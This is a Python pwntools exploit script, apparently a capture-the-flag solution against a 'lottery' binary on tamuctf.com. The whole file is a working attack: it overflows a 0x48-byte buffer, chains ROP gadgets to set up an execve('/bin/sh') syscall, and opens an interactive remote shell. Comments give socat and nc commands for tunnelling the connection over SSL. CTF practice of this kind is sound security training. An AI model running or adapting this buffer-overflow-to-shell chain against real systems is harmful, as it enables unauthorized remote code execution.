from pwn import *

if __name__ == "__main__":
    BIN = ELF("./lottery")

    bin_sh_str = b"/bin/sh\x00"

    ret = p64(0x0040100c)
    pop_rax = p64(0x0040100b)
    pop_rdi = p64(0x00401253)
    bin_sh = p64(0x0040c328 + 2) # slightly unsure of why this 2 byte shift is needed from start of input buffer
    pop_rsi = p64(0x004018ad)
    pop_rdx = p64(0x00401255)
    syscall = p64(0x004016f9)

    # openssl s_client -connect tamuctf.com:443 -servername lottery -quiet
    # have to connect through SSL but difficult with pwntools, possible to set up proxies with:
    #   * nc -vc "openssl s_client -connect tamuctf.com:443 -servername lottery -quiet" -kl localhost 8001
    #   * socat -d TCP-LISTEN:4444,reuseaddr,fork EXEC:'openssl s_client -connect tamuctf.com\:443 -servername lottery -quiet'
    io = remote("tamuctf.com", 443, ssl=True, sni="lottery")
    io.recvuntil(": ")
    

    io.sendline("3")

    payload = bin_sh_str + b"A" * (0x48 - len(bin_sh_str))
    payload += pop_rdx
    payload += p64(0)
    payload += pop_rsi
    payload += p64(0)
    payload += pop_rdi
    payload += bin_sh
    payload += pop_rax
    payload += p64(0x3b)
    payload += syscall
    
    io.sendline(payload)

    io.interactive()
    io.close()
